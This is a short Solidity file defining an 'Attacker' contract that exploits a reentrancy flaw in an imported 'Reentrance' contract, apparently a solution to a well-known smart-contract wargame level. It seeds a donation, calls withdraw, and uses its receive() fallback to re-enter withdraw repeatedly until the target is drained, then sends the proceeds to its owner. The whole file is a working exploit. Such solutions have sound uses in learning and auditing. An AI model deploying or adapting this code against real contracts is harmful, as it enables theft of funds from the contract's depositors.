// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract Attacker {
    Reentrance public target;
    uint256 public chunk;
    address public owner;

    constructor(address _target) payable {
        target = Reentrance(payable(_target));
        owner = msg.sender;
    }

    function seed() external payable {
        chunk = msg.value;
        target.donate{value: msg.value}(address(this));
    }

    function attack() external {
        target.withdraw(chunk);
    }

    receive() external payable {
        if (address(target).balance >= chunk) {
            target.withdraw(chunk);
        }
    }

    function collect() external {
        require(msg.sender == owner, "not owner");
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "collect failed");
    }
}
